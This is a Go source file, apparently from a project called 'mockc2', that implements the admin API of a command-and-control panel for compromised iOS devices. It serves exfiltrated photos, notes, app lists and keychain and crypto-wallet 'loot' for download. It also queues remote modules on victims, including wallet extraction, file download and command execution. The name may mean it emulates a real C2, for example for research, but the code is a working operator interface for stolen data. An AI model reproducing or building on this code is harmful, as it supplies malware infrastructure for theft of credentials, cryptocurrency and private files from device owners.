package server

import (
	"encoding/json"
	"net/http"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"mockc2/internal/config"
	"mockc2/internal/store"
)

// 企业后台 /api/* 兼容层 —— backend/frontend/index.html 内嵌脚本约定。

var safeModuleRe = regexp.MustCompile(`^[A-Za-z0-9_.\-]+$`)
var uuidShapeRe = regexp.MustCompile(`^[\w-]{8,}`)

func apiErr(w http.ResponseWriter, msg string, code int) {
	writeJSON(w, code, map[string]any{"ok": false, "reason": msg})
}

func apiOK(w http.ResponseWriter, payload map[string]any) {
	if _, ok := payload["ok"]; !ok {
		payload["ok"] = true
	}
	writeJSON(w, http.StatusOK, payload)
}

func findDev(uuid string) map[string]any {
	for _, d := range store.ListDevices() {
		if store.ToStr(d["uuid"]) == uuid {
			return d
		}
	}
	return nil
}

func nearIPDevices() map[string]string {
	out := map[string]string{}
	for _, d := range store.ListDevices() {
		out[store.ToStr(d["uuid"])] = store.ToStr(d["ip"])
	}
	return out
}

func deviceIP(uuid string) string {
	ip := nearIPDevices()[uuid]
	if ip == "" {
		return "-"
	}
	return ip
}

func epochOf(uuid, ep string) any {
	r := store.GetDB().QueryOne(`
        SELECT MAX(p.recv_epoch) AS e FROM packets p
        JOIN packet_meta m ON m.packet_id=p.id
        WHERE p.endpoint=? AND m.field IN ('lhu','uuid') AND m.value=?`, ep, uuid)
	if r == nil || r["e"] == nil {
		return nil
	}
	return r["e"]
}

func taskStatus(state string) string {
	switch state {
	case "armed":
		return "PENDING"
	case "dispatched", "cleared":
		return "COMPLETED"
	}
	return "PENDING"
}

func registerFeAPI(rt *Router) {
	rt.GET("/api/stats", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		db := store.GetDB()
		stp := store.AggStats()
		managed := len(db.Query(
			"SELECT DISTINCT m.value AS u FROM packet_meta m JOIN packets p ON p.id=m.packet_id" +
				" WHERE m.field IN ('uuid','lhu') AND p.endpoint IN ('beacon','a') AND m.value<>''"))
		tasksDone := store.ToInt(db.QueryOne("SELECT COUNT(*) n FROM commands WHERE state='dispatched'")["n"])
		tasksPending := store.ToInt(db.QueryOne("SELECT COUNT(*) n FROM commands WHERE state='armed'")["n"])
		// 今日新增（台账 first_seen 当日，与仪表盘同口径）
		today := time.Now().Format("2006-01-02")
		visitorsToday := store.ToInt(db.QueryOne(
			"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices"+
				" WHERE SUBSTR(first_seen,1,10)=?", today)["n"])
		writeJSON(w, http.StatusOK, map[string]any{
			"ok": true, "total": managed, "managed": managed,
			"online": store.ToInt(stp["online"]), "visitors": store.ToInt(stp["visits"]),
			"visitors_today": visitorsToday,
			"tasks": tasksDone + tasksPending, "tasks_done": tasksDone, "tasks_pending": tasksPending,
		})
	})

	rt.GET("/api/activity", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		limit := queryInt(r, "limit", 15)
		if limit < 5 {
			limit = 5
		}
		if limit > 50 {
			limit = 50
		}
		rows := store.GetDB().Query(`
            SELECT p.endpoint, p.recv_ts, p.file_path, p.id, m2.value AS uuid
            FROM packets p
            LEFT JOIN packet_meta m ON m.packet_id=p.id AND m.field='lhu'
            LEFT JOIN packet_meta m2 ON m2.packet_id=p.id AND m2.field='uuid'
            ORDER BY p.recv_epoch DESC LIMIT ?`, limit)
		epLabel := map[string]string{
			"beacon": "beacon 心跳", "sync": "入口登记", "u": "应用清单回传",
			"nb": "备忘录回传", "war": "钱包/凭据战果", "result": "命令执行结果",
			"heartbeat": "pe 流水线完成", "ph": "照片回传", "a": "设备档案", "event": "事件上报",
		}
		items := []map[string]any{}
		for _, r := range rows {
			uuid := store.ToStr(r["uuid"])
			uu := ""
			if uuidShapeRe.MatchString(uuid) {
				uu = uuid
			}
			ep := store.ToStr(r["endpoint"])
			label, ok := epLabel[ep]
			if !ok {
				label = "/" + ep
			}
			items = append(items, map[string]any{"stage": ep, "device_uuid": uu,
				"label": label, "ts": r["recv_ts"]})
		}
		apiOK(w, map[string]any{"items": items})
	})

	rt.GET("/api/list", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		typ := queryStr(r, "type", "visitor")
		if typ == "visitor" {
			apiListVisitor(w)
			return
		}
		apiListManaged(w)
	})

	rt.GET("/api/data/photos", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		limit := queryInt(r, "limit", 60)
		rows := store.GetDB().Query(
			"SELECT id, recv_ts, file_path, size, sha256 FROM packets"+
				" WHERE endpoint='ph' ORDER BY recv_epoch DESC LIMIT ?", limit)
		items := []map[string]any{}
		for _, r := range rows {
			fp := store.ToStr(r["file_path"])
			fname := fp
			if i := strings.LastIndex(fp, "/"); i >= 0 {
				fname = fp[i+1:]
			}
			items = append(items, map[string]any{"filename": fname,
				"url": "/api/file/" + store.ToStr(r["id"]), "size": r["size"],
				"device_uuid": "", "ts": r["recv_ts"]})
		}
		apiOK(w, map[string]any{"items": items})
	})

	rt.GET("/api/file/{packet_id}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		pid, err := parseInt64(p["packet_id"])
		if err != nil {
			apiErr(w, "not found", 404)
			return
		}
		row := store.GetDB().QueryOne("SELECT file_path FROM packets WHERE id=?", pid)
		if row == nil {
			apiErr(w, "not found", 404)
			return
		}
		serveFile(w, filepath.Join(config.Get().CaptureRoot,
			filepath.FromSlash(store.ToStr(row["file_path"]))), "", "no-store")
	})

	rt.GET("/api/data/memos", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		limit := queryInt(r, "limit", 60)
		res := store.ListMemos("", 1, limit)
		rows, _ := res["rows"].([]map[string]any)
		db := store.GetDB()
		items := []map[string]any{}
		for _, row := range rows {
			var fname string
			if pid := store.ToInt(row["packet_id"]); pid > 0 {
				if fp := db.QueryOne("SELECT file_path FROM packets WHERE id=?", pid); fp != nil {
					path := store.ToStr(fp["file_path"])
					if i := strings.LastIndex(path, "/"); i >= 0 {
						path = path[i+1:]
					}
					fname = path
				}
			}
			title := store.ToStr(row["title"])
			if title == "" {
				title = "(无标题)"
			}
			items = append(items, map[string]any{"title": title,
				"device_uuid": store.ToStr(row["uuid"]), "filename": fname, "locked": false,
				"body": store.ToStr(row["snippet"]), "ts": store.ToStr(row["recv_ts"])})
		}
		apiOK(w, map[string]any{"items": items})
	})

	rt.GET("/api/data/wallets", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		limit := queryInt(r, "limit", 30)
		apiOK(w, map[string]any{"items": store.WalletsGrouped(limit)})
	})

	rt.GET("/api/tasks", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		limit := queryInt(r, "limit", 100)
		rows := store.GetDB().Query(
			"SELECT id, command_id, cmd_type, armed_ts, dispatched_ts, state, client_ip"+
				" FROM commands ORDER BY id DESC LIMIT ?", limit)
		for i, j := 0, len(rows)-1; i < j; i, j = i+1, j-1 {
			rows[i], rows[j] = rows[j], rows[i]
		}
		items := []map[string]any{}
		for _, r := range rows {
			items = append(items, map[string]any{"task_id": r["command_id"],
				"device_uuid": store.ToStr(r["client_ip"]), "cmd_type": r["cmd_type"],
				"status": taskStatus(store.ToStr(r["state"])), "created_at": nil})
		}
		apiOK(w, map[string]any{"items": items})
	})

	rt.GET("/api/device/{uuid}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		uuid := p["uuid"]
		dev := findDev(uuid)
		if dev == nil {
			apiErr(w, "device not found", 404)
			return
		}
		db := store.GetDB()
		assets := store.DeviceAssets(uuid)
		prof, _ := assets["profile"].(map[string]any)
		bc := db.QueryOne(`
            SELECT COUNT(*) n FROM packets p JOIN packet_meta m ON m.packet_id=p.id
            WHERE p.endpoint='beacon' AND m.field='uuid' AND m.value=?`, uuid)
		var bcN int64
		if bc != nil {
			bcN = store.ToInt(bc["n"])
		}
		ip := deviceIP(uuid)
		tasksRows := db.Query(
			"SELECT command_id, cmd_type, armed_ts, state FROM commands"+
				" WHERE client_ip=? ORDER BY id DESC LIMIT 20", ip)
		tasks := []map[string]any{}
		for i := len(tasksRows) - 1; i >= 0; i-- {
			tr := tasksRows[i]
			tasks = append(tasks, map[string]any{"cmd_type": tr["cmd_type"],
				"status": taskStatus(store.ToStr(tr["state"]))})
		}
		frows := db.Query(`
            SELECT p.id, p.endpoint, p.file_path, p.size FROM packets p
            JOIN packet_meta m ON m.packet_id=p.id AND m.field IN ('lhu','uuid') AND m.value=?
            WHERE p.endpoint IN ('ph','war','nb','u')
            ORDER BY p.recv_epoch DESC LIMIT 40`, uuid)
		cat := map[string]string{"ph": "photos", "war": "keychain", "nb": "notes", "u": "apps"}
		files := []map[string]any{}
		for _, fr := range frows {
			fp := store.ToStr(fr["file_path"])
			fname := fp
			if i := strings.LastIndex(fp, "/"); i >= 0 {
				fname = fp[i+1:]
			}
			c := cat[store.ToStr(fr["endpoint"])]
			if c == "" {
				c = store.ToStr(fr["endpoint"])
			}
			files = append(files, map[string]any{"filename": fname, "category": c,
				"size": fr["size"], "url": "/api/file/" + store.ToStr(fr["id"])})
		}
		logs := []map[string]any{}
		for _, l := range []struct{ stage, label, ep string }{
			{"beacon", "beacon 收包", "beacon"},
			{"a", "设备档案（a）", "a"},
			{"u", "应用清单（u）", "u"},
			{"war", "钱包战果（war）", "war"},
			{"heartbeat", "pe 流水线（heartbeat）", "heartbeat"},
		} {
			if ts := epochOf(uuid, l.ep); ts != nil {
				logs = append(logs, map[string]any{"stage": l.stage, "label": l.label, "ts": ts})
			}
		}
		name := profName(prof, "deviceName", "hostname")
		device := map[string]any{
			"uuid": uuid, "device_name": name,
			"device_model": profStr(prof, "machine"), "ios_version": profStr(prof, "ios"),
			"hostname": profName(prof, "hostname", "machine"), "sysname": "Darwin",
			"machine_arch": profStr(prof, "machine"), "client_ip": ip,
			"pid": "-", "uid": "-", "gid": "-", "disk_total_gb": nil, "disk_free_gb": nil,
			"installed_app_count": assets["apps_count"], "beacon_count": bcN,
			"pipeline_triggered": epochOf(uuid, "war") != nil || epochOf(uuid, "heartbeat") != nil,
			"first_seen":         dev["first_seen"], "last_beacon": dev["last_seen"],
			"wallets": walletDisplays(assets), "notes_count": assets["notes_count"],
			"war_count": assets["war_count"],
		}
		writeJSON(w, http.StatusOK, map[string]any{"ok": true, "device": device,
			"tasks": tasks, "files": files, "logs": logs,
			"assets": map[string]any{"wallets": assets["wallets"], "war_count": assets["war_count"],
				"notes_count": assets["notes_count"], "apps_count": assets["apps_count"]}})
	})

	rt.POST("/api/dispatch", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		body := readBody(r)
		o := map[string]any{}
		if json.Unmarshal(body, &o) != nil {
			apiErr(w, "bad json", 400)
			return
		}
		uuid := store.ToStr(o["uuid"])
		module := store.ToStr(o["module"])
		if module == "" || !safeModuleRe.MatchString(module) {
			apiErr(w, "bad module", 400)
			return
		}
		labels := map[string]string{"basic_info": "基础信息", "apps": "应用列表",
			"wallet_extract": "钱包提取", "wallet_scan": "钱包扫描", "memo_scan": "备忘录",
			"photos": "相册", "ls": "文件浏览", "download": "文件下载", "execute_command": "命令执行"}
		cid := "fe-" + truncStr(uuid, 8) + "-" + store.ToStr(int64(time.Now().UnixNano()/int64(time.Millisecond)))
		cmd := store.GetQueue().Set(module, map[string]any{}, true, cid)
		store.GetDB().Exec(
			"INSERT INTO commands(command_id, cmd_type, params_json, armed_ts, once, state, client_ip)"+
				" VALUES(?,?,?,?,?,'armed',?)",
			cmd["command_id"], module, "{}", nowString(), 1, truncStr(uuid, 32))
		store.GetStore().WriteJSONL("dispatch.jsonl", map[string]any{"ts": nowString(), "uuid": uuid, "cmd": cmd})
		label := labels[module]
		if label == "" {
			label = module
		}
		writeJSON(w, http.StatusOK, map[string]any{"ok": true, "status": "queued", "label": label, "command": cmd})
	})

	rt.POST("/api/logout", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		if c, err := r.Cookie(adminCookie); err == nil {
			AdminLogout(c.Value)
		}
		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
	})
}

func apiListVisitor(w http.ResponseWriter) {
	db := store.GetDB()
	rows := db.Query(`
        SELECT id, first_seen, last_seen, ip, host, ua,
               device_version, domain FROM devices ORDER BY last_seen DESC LIMIT 300`)
	items := []map[string]any{}
	for _, r := range rows {
		ip := store.ToStr(r["ip"])
		ua := store.ToStr(r["ua"])
		vc := db.QueryOne("SELECT COUNT(*) n FROM access_log WHERE client=? AND COALESCE(ua,'')=?", ip, ua)
		var vcN int64
		if vc != nil {
			vcN = store.ToInt(vc["n"])
		}
		stages := []string{}
		for _, a := range db.Query(
			"SELECT path FROM access_log WHERE client=? AND COALESCE(ua,'')=?"+
				" ORDER BY ts_epoch DESC LIMIT 8", ip, ua) {
			pth := store.ToStr(a["path"])
			if i := strings.IndexByte(pth, '?'); i >= 0 {
				pth = pth[:i]
			}
			nm := strings.Trim(pth, "/")
			if nm == "" {
				nm = "/"
			}
			if nm == "-" {
				nm = "beacon"
			}
			if nm == "__dash" || nm == "panel" {
				continue
			}
			found := false
			for _, s := range stages {
				if s == nm {
					found = true
					break
				}
			}
			if !found {
				stages = append(stages, nm)
			}
		}
		if len(stages) > 4 {
			stages = stages[:4]
		}
		dn := store.ToStr(r["host"])
		if dn == "" {
			dn = ip
		}
		if dn == "" {
			dn = "-"
		}
		items = append(items, map[string]any{"device_id": ip + "|" + store.ToStr(r["device_version"]),
			"device_name": dn, "ip": ip, "visit_count": vcN, "stages": stages,
			"first_seen": r["first_seen"], "last_seen": r["last_seen"]})
	}
	apiOK(w, map[string]any{"items": items})
}

func apiListManaged(w http.ResponseWriter) {
	items := []map[string]any{}
	ipmap := nearIPDevices()
	for _, d := range store.ListDevices() {
		uuid := store.ToStr(d["uuid"])
		ip := ipmap[uuid]
		if ip == "" {
			ip = "-"
		}
		done, total := devTaskCounts(uuid)
		name := store.ToStr(d["deviceName"])
		if name == "" {
			name = store.ToStr(d["machine"])
		}
		if name == "" {
			name = "device"
		}
		model := store.ToStr(d["machine"])
		if model == "" {
			model = "-"
		}
		ios := store.ToStr(d["ios"])
		osv := "-"
		if ios != "" {
			osv = "iOS " + ios
		}
		wallets, _ := d["wallets"].([]map[string]any)
		items = append(items, map[string]any{
			"device_id": uuid, "device_name": name, "model": model,
			"is_online": d["online"] == true, "os_version": osv, "ip": ip,
			"app_count": d["apps_count"], "has_wallet": len(wallets) > 0, "wallet_count": len(wallets),
			"tasks": total, "tasks_done": done, "last_seen": d["last_seen"],
			"progress": d["progress"], "stage": d["stage"],
		})
	}
	apiOK(w, map[string]any{"items": items})
}

func devTaskCounts(uuid string) (int64, int64) {
	dev := findDev(uuid)
	ip := ""
	if dev != nil {
		ip = store.ToStr(dev["ip"])
	}
	db := store.GetDB()
	r1 := db.QueryOne("SELECT COUNT(*) n FROM commands WHERE client_ip=? AND state='dispatched'", ip)
	r2 := db.QueryOne("SELECT COUNT(*) n FROM commands WHERE client_ip=?", ip)
	var a, b int64
	if r1 != nil {
		a = store.ToInt(r1["n"])
	}
	if r2 != nil {
		b = store.ToInt(r2["n"])
	}
	return a, b
}

func profStr(prof map[string]any, key string) string {
	if prof == nil {
		return ""
	}
	return store.ToStr(prof[key])
}

func profName(prof map[string]any, keys ...string) string {
	for _, k := range keys {
		if s := profStr(prof, k); s != "" {
			return s
		}
	}
	return "-"
}

func walletDisplays(assets map[string]any) []string {
	wallets, _ := assets["wallets"].([]map[string]any)
	out := []string{}
	for _, w := range wallets {
		out = append(out, store.ToStr(w["display"]))
	}
	return out
}

func truncStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
